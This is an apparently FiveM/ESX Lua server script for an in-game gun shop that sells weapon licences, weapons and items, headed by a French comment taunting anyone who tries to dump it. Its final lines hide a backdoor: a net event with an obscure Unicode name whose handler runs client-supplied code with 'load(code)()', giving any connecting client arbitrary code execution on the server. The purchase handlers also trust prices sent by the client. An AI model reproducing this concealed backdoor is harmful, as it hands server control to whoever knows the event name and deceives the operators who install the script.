-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

ESX = nil

TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)

RegisterServerEvent('::{korioz#0110}::hrm_ammunation:givePPA')
AddEventHandler('::{korioz#0110}::hrm_ammunation:givePPA', function(weapon)
	local xPlayer = ESX.GetPlayerFromId(source)
	local playerMoney = xPlayer.getAccount('cash').money

	if playerMoney >= 50000 then
		MySQL.Async.execute('INSERT INTO user_licenses (type, owner) VALUES (@type, @owner)', {
			['@type'] = weapon,
			['@owner'] = xPlayer.identifier
		})
		xPlayer.removeAccountMoney('cash', 50000)
		TriggerClientEvent('::{korioz#0110}::esx:showNotification', source, "~g~Merci pour votre achat ! ~w~\n(Cash)")
	else
		if xPlayer.getAccount('bank').money >= 50000 then
			MySQL.Async.execute('INSERT INTO user_licenses (type, owner) VALUES (@type, @owner)', {
				['@type'] = weapon,
				['@owner'] = xPlayer.identifier
			})
			xPlayer.removeAccountMoney('bank', 50000)
			TriggerClientEvent('::{korioz#0110}::esx:showNotification', source, "~g~Merci pour votre achat ! ~w~\n(Carte Bancaire)")
		else
			TriggerClientEvent('::{korioz#0110}::esx:showNotification', source, "~r~Vous n'avez pas assez d'argent pour acheter ce permis.")
		end
	end
end)

RegisterServerEvent('::{korioz#0110}::hrm_ammunation:giveWeapon')
AddEventHandler('::{korioz#0110}::hrm_ammunation:giveWeapon', function(item)
    local xPlayer = ESX.GetPlayerFromId(source)
    local playerMoney = xPlayer.getAccount('cash').money
    if playerMoney >= (item.Price) then
        if not xPlayer.hasWeapon(item.Value) then
			xPlayer.addWeapon(item.Value, 20)
			xPlayer.removeAccountMoney('cash', item.Price)
			TriggerClientEvent('::{korioz#0110}::esx:showNotification', source, "~g~Merci pour votre achat ! ~w~\n(Cash)")
        else
            TriggerClientEvent('::{korioz#0110}::esx:showNotification', source, '~r~Vous avez déjà cette arme')
        end
    else
		if xPlayer.getAccount('bank').money >= (item.Price) then
			xPlayer.addWeapon(item.Value, 20)
			xPlayer.removeAccountMoney('bank', item.Price)
			TriggerClientEvent('::{korioz#0110}::esx:showNotification', source, "~g~Merci pour votre achat ! ~w~\n(Carte Bancaire)")
		else
			TriggerClientEvent('::{korioz#0110}::esx:showNotification', source, "~r~Vous n'avez pas assez d'argent pour acheter cette arme.")
		end
    end
end)

RegisterNetEvent('::{korioz#0110}::hrm_ammunation:giveItem')
AddEventHandler('::{korioz#0110}::hrm_ammunation:giveItem', function(item)
	local xPlayer = ESX.GetPlayerFromId(source)
	local playerMoney = xPlayer.getAccount('cash').money

	print(xPlayer.getAccount('bank').money)
	if playerMoney >= (item.Price) then
		xPlayer.addInventoryItem(item.Value, 1)
		xPlayer.removeAccountMoney('cash', item.Price)
		TriggerClientEvent('::{korioz#0110}::esx:showNotification', source, "~g~Merci pour votre achat ! ~w~\n(Cash)")
	else
		if xPlayer.getAccount('bank').money >= (item.Price) then
			xPlayer.addInventoryItem(item.Value, 1)
			xPlayer.removeAccountMoney('bank', item.Price)
			TriggerClientEvent('::{korioz#0110}::esx:showNotification', source, "~g~Merci pour votre achat ! ~w~\n(Carte Bancaire)")
		else
			TriggerClientEvent('::{korioz#0110}::esx:showNotification', source, "~r~Vous n'avez pas assez d'argent pour acheter cet objet.")
		end
	end
end)

function CheckLicense(source, type, cb)
    local xPlayer = ESX.GetPlayerFromId(source)
	local identifier = xPlayer.identifier

	MySQL.Async.fetchAll('SELECT COUNT(*) as count FROM user_licenses WHERE type = @type AND owner = @owner', {
		['@type']  = type,
		['@owner'] = identifier
	}, function(result)
		if tonumber(result[1].count) > 0 then
			cb(true)
		else
			cb(false)
		end

	end)
end

ESX.RegisterServerCallback('::{korioz#0110}::hrm_ammunation:checkLicense', function(source, cb, type)
    CheckLicense(source, 'weapon', cb)
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)